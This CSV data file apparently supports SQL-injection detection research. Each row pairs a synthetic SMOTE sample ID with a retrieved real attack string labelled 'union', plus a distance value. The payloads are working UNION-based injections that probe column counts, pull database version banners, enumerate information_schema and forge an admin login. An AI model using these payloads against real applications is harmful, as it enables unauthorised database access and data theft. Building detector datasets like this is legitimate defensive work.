id,label,payload_type,payload,retrieval_method,retrieval_source_id,retrieval_distance
SMOTE_000352,attack,union,"-4955%' union all select 5928,5928--",nearest_attack_euclidean,R000020,0.28726266366917014
SMOTE_000353,attack,union,"1234 ' AND 1  =  0 UNION ALL SELECT 'admin', '81dc9bdb52d04dc20036dbd8313ed055",nearest_attack_euclidean,R000010,0.08359990978669805
SMOTE_000354,attack,union,"-1550' in boolean mode  )   union all select 9777,9777,9777--",nearest_attack_euclidean,R000023,0.4857495587187458
SMOTE_000355,attack,union,"-9046'   )    )    as ymqc where 3733  =  3733 union all select 3733,3733,3733,3733,3733,3733,3733--",nearest_attack_euclidean,R000011,1.4297661589923911
SMOTE_000356,attack,union,"-4318""  )   as vpvt where 5543  =  5543 union all select 5543,5543,5543,5543,5543,5543--",nearest_attack_euclidean,R000016,0.895258180967218
SMOTE_000357,attack,union," select * from users where id  =  1 + \+*$ union select null,@@VERSION -- 1",nearest_attack_euclidean,R000009,0.9359721055264598
SMOTE_000358,attack,union,"-7848%"" union all select 1580,1580,1580,1580,1580,1580,1580--",nearest_attack_euclidean,R000018,1.6247128526492385
SMOTE_000359,attack,union,"1234 "" AND 1  =  0 UNION ALL SELECT ""admin"", ""81dc9bdb52d04dc20036dbd8313ed055",nearest_attack_euclidean,R000002,2.9588446322311883
SMOTE_000360,attack,union,"-4318""  )   as vpvt where 5543  =  5543 union all select 5543,5543,5543,5543,5543,5543--",nearest_attack_euclidean,R000016,1.0804060036845222
SMOTE_000361,attack,union,"1234 "" AND 1  =  0 UNION ALL SELECT ""admin"", ""81dc9bdb52d04dc20036dbd8313ed055",nearest_attack_euclidean,R000002,3.5714734410825555
SMOTE_000362,attack,union,"-2384'||  (  select 'vhcp' from dual where 1266  =  1266 union all select 1266,1266,1266,1266--",nearest_attack_euclidean,R000017,0.8632589855046011
SMOTE_000363,attack,union,"-5817' in boolean mode  )   union all select 2391,2391,2391,2391,2391--",nearest_attack_euclidean,R000027,1.0054646710732642
SMOTE_000364,attack,union,"-7963'+  (  select 'kxzh' where 7039  =  7039 union all select 7039,7039,7039,7039,7039,7039--",nearest_attack_euclidean,R000031,0.3883437525754373
SMOTE_000365,attack,union,"-4876""   )    )    as saug where 2256  =  2256 union all select 2256,2256,2256,2256,2256,2256,2256,2256,2256,2256--",nearest_attack_euclidean,R000024,0.899363074225001
SMOTE_000366,attack,union,"-9046'   )    )    as ymqc where 3733  =  3733 union all select 3733,3733,3733,3733,3733,3733,3733--",nearest_attack_euclidean,R000011,0.5885453486610229
SMOTE_000367,attack,union,"-6436' in boolean mode  )   union all select 7589,7589,7589,7589--",nearest_attack_euclidean,R000028,0.5499470512926791
SMOTE_000368,attack,union,"-9098'||  (  select 'xodn' from dual where 8202  =  8202 union all select 8202,8202,8202,8202,8202,8202,8202--",nearest_attack_euclidean,R000029,0.44213905787224145
SMOTE_000369,attack,union,"-9046'   )    )    as ymqc where 3733  =  3733 union all select 3733,3733,3733,3733,3733,3733,3733--",nearest_attack_euclidean,R000011,1.0105139473162097
SMOTE_000370,attack,union,"-7848%"" union all select 1580,1580,1580,1580,1580,1580,1580--",nearest_attack_euclidean,R000018,0.838951684460314
SMOTE_000371,attack,union,"-7111%"" union all select 6083,6083,6083,6083,6083,6083--",nearest_attack_euclidean,R000014,0.35002509156266526
SMOTE_000372,attack,union,"-2384'||  (  select 'vhcp' from dual where 1266  =  1266 union all select 1266,1266,1266,1266--",nearest_attack_euclidean,R000017,0.17975233194583848
SMOTE_000373,attack,union,"-2305' in boolean mode  )   union all select 8147,8147,8147,8147,8147,8147,8147,8147,8147,8147--",nearest_attack_euclidean,R000019,1.216478248838444
SMOTE_000374,attack,union,"-9046'   )    )    as ymqc where 3733  =  3733 union all select 3733,3733,3733,3733,3733,3733,3733--",nearest_attack_euclidean,R000011,0.32180474111977936
SMOTE_000375,attack,union," select * from users where id  =  1 ||1 union select null,banner from v$version where rownum  =  1 -- 1",nearest_attack_euclidean,R000001,0.08179854659074078
SMOTE_000376,attack,union," select * from users where id  =  '1' or 1^  =  1 union select 1,banner from v$version where rownum  =  1 -- 1'",nearest_attack_euclidean,R000006,3.040487936806837
SMOTE_000377,attack,union," select * from users where id  =  1 ||1 union select null,banner from v$version where rownum  =  1 -- 1",nearest_attack_euclidean,R000001,3.0628261797036624
SMOTE_000378,attack,union,"1234 ' AND 1  =  0 UNION ALL SELECT 'admin', '81dc9bdb52d04dc20036dbd8313ed055",nearest_attack_euclidean,R000010,0.3871693822094814
SMOTE_000379,attack,union,"-2384'||  (  select 'vhcp' from dual where 1266  =  1266 union all select 1266,1266,1266,1266--",nearest_attack_euclidean,R000017,0.7196376138770137
SMOTE_000380,attack,union,"-7963'+  (  select 'kxzh' where 7039  =  7039 union all select 7039,7039,7039,7039,7039,7039--",nearest_attack_euclidean,R000031,1.3085871067708688
SMOTE_000381,attack,union,"-4318""  )   as vpvt where 5543  =  5543 union all select 5543,5543,5543,5543,5543,5543--",nearest_attack_euclidean,R000016,0.8427309289165712
SMOTE_000382,attack,union," select * from users where id  =  1 + \+*$ union select null,@@VERSION -- 1",nearest_attack_euclidean,R000009,3.269985736509197
SMOTE_000383,attack,union,"-3009'+  (  select 'gqbo' where 6915  =  6915 union all select 6915,6915--",nearest_attack_euclidean,R000021,1.2678300141731818
SMOTE_000384,attack,union,"-2384'||  (  select 'vhcp' from dual where 1266  =  1266 union all select 1266,1266,1266,1266--",nearest_attack_euclidean,R000017,0.8194192582813737
SMOTE_000385,attack,union,"-3226'||  (  select 'ykdw' where 2617  =  2617 union all select 2617,2617--",nearest_attack_euclidean,R000030,0.1406957577136176
SMOTE_000386,attack,union,"-1876'||  (  select 'itfc' from dual where 9584  =  9584 union all select 9584,9584,9584,9584,9584,9584,9584,9584--",nearest_attack_euclidean,R000026,1.1538686600861983
SMOTE_000387,attack,union,"-5776%' union all select 3075,3075,3075,3075,3075--",nearest_attack_euclidean,R000013,1.0610187296192681
SMOTE_000388,attack,union,"-9098'||  (  select 'xodn' from dual where 8202  =  8202 union all select 8202,8202,8202,8202,8202,8202,8202--",nearest_attack_euclidean,R000029,1.150800111666635
SMOTE_000389,attack,union,"-2384'||  (  select 'vhcp' from dual where 1266  =  1266 union all select 1266,1266,1266,1266--",nearest_attack_euclidean,R000017,1.2558333821402061
SMOTE_000390,attack,union,"-3226'||  (  select 'ykdw' where 2617  =  2617 union all select 2617,2617--",nearest_attack_euclidean,R000030,3.2670492349617053
SMOTE_000391,attack,union," select * from users where id  =  1 + \+*$ union select null,@@VERSION -- 1",nearest_attack_euclidean,R000009,2.1813531437280154
SMOTE_000392,attack,union," select * from users where id  =  '1' or 1^  =  1 union select 1,banner from v$version where rownum  =  1 -- 1'",nearest_attack_euclidean,R000006,1.1981605083157174
SMOTE_000393,attack,union,"-4876""   )    )    as saug where 2256  =  2256 union all select 2256,2256,2256,2256,2256,2256,2256,2256,2256,2256--",nearest_attack_euclidean,R000024,1.078704596779024
SMOTE_000394,attack,union,"-7485""   )    )    as caob where 4100  =  4100 union all select 4100,4100,4100,4100,4100,4100,4100,4100--",nearest_attack_euclidean,R000012,1.0137240137657522
SMOTE_000395,attack,union,"-9098'||  (  select 'xodn' from dual where 8202  =  8202 union all select 8202,8202,8202,8202,8202,8202,8202--",nearest_attack_euclidean,R000029,0.5003577216770637
SMOTE_000396,attack,union,"-7963'+  (  select 'kxzh' where 7039  =  7039 union all select 7039,7039,7039,7039,7039,7039--",nearest_attack_euclidean,R000031,2.2706378509906746
SMOTE_000397,attack,union,"-5817' in boolean mode  )   union all select 2391,2391,2391,2391,2391--",nearest_attack_euclidean,R000027,0.19555061989635678
SMOTE_000398,attack,union,"-9098'||  (  select 'xodn' from dual where 8202  =  8202 union all select 8202,8202,8202,8202,8202,8202,8202--",nearest_attack_euclidean,R000029,0.9945179928744278
SMOTE_000399,attack,union,"-6436' in boolean mode  )   union all select 7589,7589,7589,7589--",nearest_attack_euclidean,R000028,3.0675103955893857
SMOTE_000400,attack,union,"-5817' in boolean mode  )   union all select 2391,2391,2391,2391,2391--",nearest_attack_euclidean,R000027,0.7736738423976165
SMOTE_000401,attack,union,"-2384'||  (  select 'vhcp' from dual where 1266  =  1266 union all select 1266,1266,1266,1266--",nearest_attack_euclidean,R000017,1.3985664379098204
SMOTE_000402,attack,union,-4058  )   union all select 9184--,nearest_attack_euclidean,R000015,1.1731199332340694
SMOTE_000403,attack,union," select * from users where id  =  '1' or 1^  =  1 union select 1,banner from v$version where rownum  =  1 -- 1'",nearest_attack_euclidean,R000006,0.9858248489300993
SMOTE_000404,attack,union,"1234 ' AND 1  =  0 UNION ALL SELECT 'admin', '81dc9bdb52d04dc20036dbd8313ed055",nearest_attack_euclidean,R000010,1.0544975824109655
SMOTE_000405,attack,union," select * from users where id  =  1 + \+*$ union select null,@@VERSION -- 1",nearest_attack_euclidean,R000009,1.7931856846502219
SMOTE_000406,attack,union," select * from users where id  =  '1' or 1^  =  1 union select 1,banner from v$version where rownum  =  1 -- 1'",nearest_attack_euclidean,R000006,3.0807541685389426
SMOTE_000407,attack,union,"-3009'+  (  select 'gqbo' where 6915  =  6915 union all select 6915,6915--",nearest_attack_euclidean,R000021,1.1344322131841995
SMOTE_000408,attack,union,"-7485""   )    )    as caob where 4100  =  4100 union all select 4100,4100,4100,4100,4100,4100,4100,4100--",nearest_attack_euclidean,R000012,0.27782333674964466
SMOTE_000409,attack,union," select * from users where id  =  '1' or 1^  =  1 union select 1,banner from v$version where rownum  =  1 -- 1'",nearest_attack_euclidean,R000006,0.3279833711969941
SMOTE_000410,attack,union,"-4955%' union all select 5928,5928--",nearest_attack_euclidean,R000020,0.3554704317131764
SMOTE_000411,attack,union," select * from users where id  =  1 ||1 union select null,banner from v$version where rownum  =  1 -- 1",nearest_attack_euclidean,R000001,0.6016786958472331
SMOTE_000412,attack,union,"-9046'   )    )    as ymqc where 3733  =  3733 union all select 3733,3733,3733,3733,3733,3733,3733--",nearest_attack_euclidean,R000011,0.04248724235335687
SMOTE_000413,attack,union," select * from users where id  =  '1' or 1^  =  1 union select 1,banner from v$version where rownum  =  1 -- 1'",nearest_attack_euclidean,R000006,1.8233845193710674
SMOTE_000414,attack,union,"-9098'||  (  select 'xodn' from dual where 8202  =  8202 union all select 8202,8202,8202,8202,8202,8202,8202--",nearest_attack_euclidean,R000029,0.07224071906845289
SMOTE_000415,attack,union," select * from users where id  =  1 ||1 union select null,banner from v$version where rownum  =  1 -- 1",nearest_attack_euclidean,R000001,1.4173543521792678
SMOTE_000416,attack,union,"-4876""   )    )    as saug where 2256  =  2256 union all select 2256,2256,2256,2256,2256,2256,2256,2256,2256,2256--",nearest_attack_euclidean,R000024,0.033509369253725614
SMOTE_000417,attack,union,"-4876""   )    )    as saug where 2256  =  2256 union all select 2256,2256,2256,2256,2256,2256,2256,2256,2256,2256--",nearest_attack_euclidean,R000024,0.5319522024787198
SMOTE_000418,attack,union,"1234 "" AND 1  =  0 UNION ALL SELECT ""admin"", ""81dc9bdb52d04dc20036dbd8313ed055",nearest_attack_euclidean,R000002,1.4249892464988518
SMOTE_000419,attack,union,"1234 ' AND 1  =  0 UNION ALL SELECT 'admin', '81dc9bdb52d04dc20036dbd8313ed055",nearest_attack_euclidean,R000010,1.3322257660901595
SMOTE_000420,attack,union,"-2384'||  (  select 'vhcp' from dual where 1266  =  1266 union all select 1266,1266,1266,1266--",nearest_attack_euclidean,R000017,1.2641628054741447
SMOTE_000421,attack,union,"-9098'||  (  select 'xodn' from dual where 8202  =  8202 union all select 8202,8202,8202,8202,8202,8202,8202--",nearest_attack_euclidean,R000029,0.7330476413145176
SMOTE_000422,attack,union,"-6067'+  (  select 'bfhf' where 3114  =  3114 union all select 3114,3114,3114,3114,3114,3114,3114,3114--",nearest_attack_euclidean,R000022,0.1345012346980136
SMOTE_000423,attack,union,"-3009'+  (  select 'gqbo' where 6915  =  6915 union all select 6915,6915--",nearest_attack_euclidean,R000021,0.555277168988348
SMOTE_000424,attack,union,"-7963'+  (  select 'kxzh' where 7039  =  7039 union all select 7039,7039,7039,7039,7039,7039--",nearest_attack_euclidean,R000031,0.9752174436626447
SMOTE_000425,attack,union,"-1550' in boolean mode  )   union all select 9777,9777,9777--",nearest_attack_euclidean,R000023,0.6121416600549687
SMOTE_000426,attack,union,"-1550' in boolean mode  )   union all select 9777,9777,9777--",nearest_attack_euclidean,R000023,0.2586316777885422
SMOTE_000427,attack,union,-4058  )   union all select 9184--,nearest_attack_euclidean,R000015,1.6298285605751688
SMOTE_000428,attack,union," select * from users where id  =  '1' or """"<@ union select 1,version  (    )   -- 1'",nearest_attack_euclidean,R000005,2.1250730990237727
SMOTE_000429,attack,union," select * from users where id  =  1 ||1 union select null,banner from v$version where rownum  =  1 -- 1",nearest_attack_euclidean,R000001,1.0719475420911666
SMOTE_000430,attack,union," select * from users where id  =  '1' union select 1""!"",banner from v$version where rownum  =  1 -- 1'",nearest_attack_euclidean,R000007,0.648510845129807
SMOTE_000431,attack,union,"-9098'||  (  select 'xodn' from dual where 8202  =  8202 union all select 8202,8202,8202,8202,8202,8202,8202--",nearest_attack_euclidean,R000029,0.8267892906213083
SMOTE_000432,attack,union,"-4876""   )    )    as saug where 2256  =  2256 union all select 2256,2256,2256,2256,2256,2256,2256,2256,2256,2256--",nearest_attack_euclidean,R000024,0.9851042622225691
SMOTE_000433,attack,union," select * from users where id  =  '1' or """"<@ union select 1,version  (    )   -- 1'",nearest_attack_euclidean,R000005,0.16672181895983698
SMOTE_000434,attack,union,-4058  )   union all select 9184--,nearest_attack_euclidean,R000015,1.1917227552730687
SMOTE_000435,attack,union,"-2384'||  (  select 'vhcp' from dual where 1266  =  1266 union all select 1266,1266,1266,1266--",nearest_attack_euclidean,R000017,0.6395046251891693
SMOTE_000436,attack,union,"-6067'+  (  select 'bfhf' where 3114  =  3114 union all select 3114,3114,3114,3114,3114,3114,3114,3114--",nearest_attack_euclidean,R000022,1.0315184151739987
SMOTE_000437,attack,union,"-2384'||  (  select 'vhcp' from dual where 1266  =  1266 union all select 1266,1266,1266,1266--",nearest_attack_euclidean,R000017,0.2942614242079493
SMOTE_000438,attack,union,"-4452%"" union all select 7141,7141,7141,7141,7141,7141,7141,7141--",nearest_attack_euclidean,R000025,0.013732623790975146
SMOTE_000439,attack,union," select * from users where id  =  1 ||1 union select null,banner from v$version where rownum  =  1 -- 1",nearest_attack_euclidean,R000001,0.7845739446028631
SMOTE_000440,attack,union,union select * from users where login   =   char ...,nearest_attack_euclidean,R000004,0.04010686575416823
SMOTE_000441,attack,union,"-4955%' union all select 5928,5928--",nearest_attack_euclidean,R000020,2.3983134975872793
SMOTE_000442,attack,union,-4058  )   union all select 9184--,nearest_attack_euclidean,R000015,0.22035085900300183
SMOTE_000443,attack,union,"-3226'||  (  select 'ykdw' where 2617  =  2617 union all select 2617,2617--",nearest_attack_euclidean,R000030,1.0403742783087873
SMOTE_000444,attack,union," select * from users where id  =  '1' or 1^  =  1 union select 1,banner from v$version where rownum  =  1 -- 1'",nearest_attack_euclidean,R000006,0.6035933606346444
SMOTE_000445,attack,union,"-2305' in boolean mode  )   union all select 8147,8147,8147,8147,8147,8147,8147,8147,8147,8147--",nearest_attack_euclidean,R000019,1.4040083370074712
SMOTE_000446,attack,union," select * from users where id  =  '1' or 1^  =  1 union select 1,banner from v$version where rownum  =  1 -- 1'",nearest_attack_euclidean,R000006,1.0199610619541164
SMOTE_000447,attack,union,"-1550' in boolean mode  )   union all select 9777,9777,9777--",nearest_attack_euclidean,R000023,2.4794400773731993
SMOTE_000448,attack,union,union select * from users where login   =   char ...,nearest_attack_euclidean,R000004,1.4912037484764862
SMOTE_000449,attack,union,"-3226'||  (  select 'ykdw' where 2617  =  2617 union all select 2617,2617--",nearest_attack_euclidean,R000030,1.6645740076994031
SMOTE_000450,attack,union,"-2384'||  (  select 'vhcp' from dual where 1266  =  1266 union all select 1266,1266,1266,1266--",nearest_attack_euclidean,R000017,0.36381282057723646
SMOTE_000451,attack,union,"-3009'+  (  select 'gqbo' where 6915  =  6915 union all select 6915,6915--",nearest_attack_euclidean,R000021,1.1716620640671678
SMOTE_000452,attack,union,"-4876""   )    )    as saug where 2256  =  2256 union all select 2256,2256,2256,2256,2256,2256,2256,2256,2256,2256--",nearest_attack_euclidean,R000024,2.542986654222808
SMOTE_000453,attack,union,"-3226'||  (  select 'ykdw' where 2617  =  2617 union all select 2617,2617--",nearest_attack_euclidean,R000030,0.6270282576063103
SMOTE_000454,attack,union," select * from users where id  =  '1' or """"<@ union select 1,version  (    )   -- 1'",nearest_attack_euclidean,R000005,0.8576596813598889
SMOTE_000455,attack,union,"-5817' in boolean mode  )   union all select 2391,2391,2391,2391,2391--",nearest_attack_euclidean,R000027,0.16373231740535965
SMOTE_000456,attack,union," )   union select * from information_schema.tables,",nearest_attack_euclidean,R000008,4.214323321427525
SMOTE_000457,attack,union," select * from users where id  =  '1' union select 1""!"",banner from v$version where rownum  =  1 -- 1'",nearest_attack_euclidean,R000007,1.1402259244419037
SMOTE_000458,attack,union,"-5817' in boolean mode  )   union all select 2391,2391,2391,2391,2391--",nearest_attack_euclidean,R000027,0.3556873781975584
SMOTE_000459,attack,union,"-7963'+  (  select 'kxzh' where 7039  =  7039 union all select 7039,7039,7039,7039,7039,7039--",nearest_attack_euclidean,R000031,1.185681566963402
SMOTE_000460,attack,union,"-5776%' union all select 3075,3075,3075,3075,3075--",nearest_attack_euclidean,R000013,0.4417469755406196
SMOTE_000461,attack,union,"-4876""   )    )    as saug where 2256  =  2256 union all select 2256,2256,2256,2256,2256,2256,2256,2256,2256,2256--",nearest_attack_euclidean,R000024,1.0430457126257793
SMOTE_000462,attack,union," select * from users where id  =  '1' union select 1""!"",banner from v$version where rownum  =  1 -- 1'",nearest_attack_euclidean,R000007,0.6236925432949629
SMOTE_000463,attack,union,"-7848%"" union all select 1580,1580,1580,1580,1580,1580,1580--",nearest_attack_euclidean,R000018,0.07929096236713046
SMOTE_000464,attack,union,"-7963'+  (  select 'kxzh' where 7039  =  7039 union all select 7039,7039,7039,7039,7039,7039--",nearest_attack_euclidean,R000031,1.188162532042477
SMOTE_000465,attack,union,union select * from users where login   =   char ...,nearest_attack_euclidean,R000004,4.650165057698384
SMOTE_000466,attack,union,"-2305' in boolean mode  )   union all select 8147,8147,8147,8147,8147,8147,8147,8147,8147,8147--",nearest_attack_euclidean,R000019,4.9337109083548185
SMOTE_000467,attack,union," select * from users where id  =  '1' union select 1""!"",banner from v$version where rownum  =  1 -- 1'",nearest_attack_euclidean,R000007,1.7792975987396762
SMOTE_000468,attack,union,"-2305' in boolean mode  )   union all select 8147,8147,8147,8147,8147,8147,8147,8147,8147,8147--",nearest_attack_euclidean,R000019,1.3639496520821741
SMOTE_000469,attack,union,"-7111%"" union all select 6083,6083,6083,6083,6083,6083--",nearest_attack_euclidean,R000014,0.023515127817353435
SMOTE_000470,attack,union,"-4452%"" union all select 7141,7141,7141,7141,7141,7141,7141,7141--",nearest_attack_euclidean,R000025,0.18584207747367634
SMOTE_000471,attack,union,"-9098'||  (  select 'xodn' from dual where 8202  =  8202 union all select 8202,8202,8202,8202,8202,8202,8202--",nearest_attack_euclidean,R000029,1.071092478877932
SMOTE_000472,attack,union,"-2384'||  (  select 'vhcp' from dual where 1266  =  1266 union all select 1266,1266,1266,1266--",nearest_attack_euclidean,R000017,1.376104587203733
SMOTE_000473,attack,union,"1234 ' AND 1  =  0 UNION ALL SELECT 'admin', '81dc9bdb52d04dc20036dbd8313ed055",nearest_attack_euclidean,R000010,0.8966660179058612
SMOTE_000474,attack,union," select * from users where id  =  1 + \+*$ union select null,@@VERSION -- 1",nearest_attack_euclidean,R000009,1.9417492429424217
SMOTE_000475,attack,union,"-7111%"" union all select 6083,6083,6083,6083,6083,6083--",nearest_attack_euclidean,R000014,0.28752264406866435
SMOTE_000476,attack,union,"-3226'||  (  select 'ykdw' where 2617  =  2617 union all select 2617,2617--",nearest_attack_euclidean,R000030,0.5917293946915535
SMOTE_000477,attack,union," select * from users where id  =  1 + \+*$ union select null,@@VERSION -- 1",nearest_attack_euclidean,R000009,2.5119210414081765
SMOTE_000478,attack,union,"-5776%' union all select 3075,3075,3075,3075,3075--",nearest_attack_euclidean,R000013,1.0871353346263153
SMOTE_000479,attack,union," )   union select * from information_schema.tables,",nearest_attack_euclidean,R000008,3.877162908679981
SMOTE_000480,attack,union,"-7963'+  (  select 'kxzh' where 7039  =  7039 union all select 7039,7039,7039,7039,7039,7039--",nearest_attack_euclidean,R000031,0.6827990262749098
SMOTE_000481,attack,union," select * from users where id  =  1 ||1 union select null,banner from v$version where rownum  =  1 -- 1",nearest_attack_euclidean,R000001,2.012939883694219
SMOTE_000482,attack,union,"-2305' in boolean mode  )   union all select 8147,8147,8147,8147,8147,8147,8147,8147,8147,8147--",nearest_attack_euclidean,R000019,4.4600407657144905e-05
SMOTE_000483,attack,union,-4058  )   union all select 9184--,nearest_attack_euclidean,R000015,0.9096016667814434
SMOTE_000484,attack,union,"-9098'||  (  select 'xodn' from dual where 8202  =  8202 union all select 8202,8202,8202,8202,8202,8202,8202--",nearest_attack_euclidean,R000029,0.3349917961166738
SMOTE_000485,attack,union,"-9098'||  (  select 'xodn' from dual where 8202  =  8202 union all select 8202,8202,8202,8202,8202,8202,8202--",nearest_attack_euclidean,R000029,0.8731103152653408
SMOTE_000486,attack,union," select * from users where id  =  '1' union select 1""!"",banner from v$version where rownum  =  1 -- 1'",nearest_attack_euclidean,R000007,3.0805665416922547
SMOTE_000487,attack,union,union select * from users where login   =   char ...,nearest_attack_euclidean,R000004,0.7900546795979977
SMOTE_000488,attack,union,"-2384'||  (  select 'vhcp' from dual where 1266  =  1266 union all select 1266,1266,1266,1266--",nearest_attack_euclidean,R000017,1.0285113767598206
SMOTE_000489,attack,union,union select * from users where login   =   char ...,nearest_attack_euclidean,R000004,3.444874764332273
SMOTE_000490,attack,union,"-9098'||  (  select 'xodn' from dual where 8202  =  8202 union all select 8202,8202,8202,8202,8202,8202,8202--",nearest_attack_euclidean,R000029,0.8632085000968263
SMOTE_000491,attack,union,"-9098'||  (  select 'xodn' from dual where 8202  =  8202 union all select 8202,8202,8202,8202,8202,8202,8202--",nearest_attack_euclidean,R000029,0.30340561909990055
SMOTE_000492,attack,union," select * from users where id  =  '1' or """"<@ union select 1,version  (    )   -- 1'",nearest_attack_euclidean,R000005,0.804105611169684
SMOTE_000493,attack,union,"-5817' in boolean mode  )   union all select 2391,2391,2391,2391,2391--",nearest_attack_euclidean,R000027,4.294101882523516
SMOTE_000494,attack,union,"1234 ' AND 1  =  0 UNION ALL SELECT 'admin', '81dc9bdb52d04dc20036dbd8313ed055",nearest_attack_euclidean,R000010,1.365177976496247
SMOTE_000495,attack,union,"1234 "" AND 1  =  0 UNION ALL SELECT ""admin"", ""81dc9bdb52d04dc20036dbd8313ed055",nearest_attack_euclidean,R000002,4.491771486601066
SMOTE_000496,attack,union," )   union select * from information_schema.tables,",nearest_attack_euclidean,R000008,3.3300191516615705
SMOTE_000497,attack,union,"-9098'||  (  select 'xodn' from dual where 8202  =  8202 union all select 8202,8202,8202,8202,8202,8202,8202--",nearest_attack_euclidean,R000029,0.5842603174967691
SMOTE_000498,attack,union,"-1550' in boolean mode  )   union all select 9777,9777,9777--",nearest_attack_euclidean,R000023,1.0029824845845556
SMOTE_000499,attack,union,"-6436' in boolean mode  )   union all select 7589,7589,7589,7589--",nearest_attack_euclidean,R000028,0.509034958415704
SMOTE_000500,attack,union,"-1550' in boolean mode  )   union all select 9777,9777,9777--",nearest_attack_euclidean,R000023,0.12833004393773018
SMOTE_000501,attack,union,"1234 "" AND 1  =  0 UNION ALL SELECT ""admin"", ""81dc9bdb52d04dc20036dbd8313ed055",nearest_attack_euclidean,R000002,1.5116794295727405
SMOTE_000502,attack,union,"-3009'+  (  select 'gqbo' where 6915  =  6915 union all select 6915,6915--",nearest_attack_euclidean,R000021,1.416935163394158
SMOTE_000503,attack,union,"-7963'+  (  select 'kxzh' where 7039  =  7039 union all select 7039,7039,7039,7039,7039,7039--",nearest_attack_euclidean,R000031,0.28800161004123737
SMOTE_000504,attack,union,"-7963'+  (  select 'kxzh' where 7039  =  7039 union all select 7039,7039,7039,7039,7039,7039--",nearest_attack_euclidean,R000031,0.6041476797215453
SMOTE_000505,attack,union,"-6067'+  (  select 'bfhf' where 3114  =  3114 union all select 3114,3114,3114,3114,3114,3114,3114,3114--",nearest_attack_euclidean,R000022,0.3021217966702905
SMOTE_000506,attack,union,"-2384'||  (  select 'vhcp' from dual where 1266  =  1266 union all select 1266,1266,1266,1266--",nearest_attack_euclidean,R000017,0.6804444247432273
SMOTE_000507,attack,union,"-6067'+  (  select 'bfhf' where 3114  =  3114 union all select 3114,3114,3114,3114,3114,3114,3114,3114--",nearest_attack_euclidean,R000022,1.455232746672233
SMOTE_000508,attack,union,"-9098'||  (  select 'xodn' from dual where 8202  =  8202 union all select 8202,8202,8202,8202,8202,8202,8202--",nearest_attack_euclidean,R000029,0.0436484319573668
SMOTE_000509,attack,union,"-4955%' union all select 5928,5928--",nearest_attack_euclidean,R000020,0.8263835030871611
SMOTE_000510,attack,union,"-7111%"" union all select 6083,6083,6083,6083,6083,6083--",nearest_attack_euclidean,R000014,1.679634571762191
SMOTE_000511,attack,union,"-9046'   )    )    as ymqc where 3733  =  3733 union all select 3733,3733,3733,3733,3733,3733,3733--",nearest_attack_euclidean,R000011,0.33025814389367175
SMOTE_000512,attack,union," select * from users where id  =  1 ||1 union select null,banner from v$version where rownum  =  1 -- 1",nearest_attack_euclidean,R000001,2.452558795669882
SMOTE_000513,attack,union," select * from users where id  =  1 + \+*$ union select null,@@VERSION -- 1",nearest_attack_euclidean,R000009,0.9360305222399663
SMOTE_000514,attack,union,"-9098'||  (  select 'xodn' from dual where 8202  =  8202 union all select 8202,8202,8202,8202,8202,8202,8202--",nearest_attack_euclidean,R000029,0.23513331738650026
SMOTE_000515,attack,union,"-7963'+  (  select 'kxzh' where 7039  =  7039 union all select 7039,7039,7039,7039,7039,7039--",nearest_attack_euclidean,R000031,0.39143081537951596
SMOTE_000516,attack,union,"-7963'+  (  select 'kxzh' where 7039  =  7039 union all select 7039,7039,7039,7039,7039,7039--",nearest_attack_euclidean,R000031,0.7024721160791495
SMOTE_000517,attack,union,"-2384'||  (  select 'vhcp' from dual where 1266  =  1266 union all select 1266,1266,1266,1266--",nearest_attack_euclidean,R000017,1.1653166101021466
SMOTE_000518,attack,union,"-2384'||  (  select 'vhcp' from dual where 1266  =  1266 union all select 1266,1266,1266,1266--",nearest_attack_euclidean,R000017,1.6594689493663777
SMOTE_000519,attack,union,"-1550' in boolean mode  )   union all select 9777,9777,9777--",nearest_attack_euclidean,R000023,1.0868139159905676
SMOTE_000520,attack,union,"-5776%' union all select 3075,3075,3075,3075,3075--",nearest_attack_euclidean,R000013,0.32895252828646454
SMOTE_000521,attack,union,"-6436' in boolean mode  )   union all select 7589,7589,7589,7589--",nearest_attack_euclidean,R000028,4.084889333625757
SMOTE_000522,attack,union,"-7963'+  (  select 'kxzh' where 7039  =  7039 union all select 7039,7039,7039,7039,7039,7039--",nearest_attack_euclidean,R000031,0.6890269659055048
SMOTE_000523,attack,union," select * from users where id  =  1 + \+*$ union select null,@@VERSION -- 1",nearest_attack_euclidean,R000009,1.2094305683721782
SMOTE_000524,attack,union,"-4955%' union all select 5928,5928--",nearest_attack_euclidean,R000020,2.286434940814109
SMOTE_000525,attack,union,"-7963'+  (  select 'kxzh' where 7039  =  7039 union all select 7039,7039,7039,7039,7039,7039--",nearest_attack_euclidean,R000031,2.354503219134953
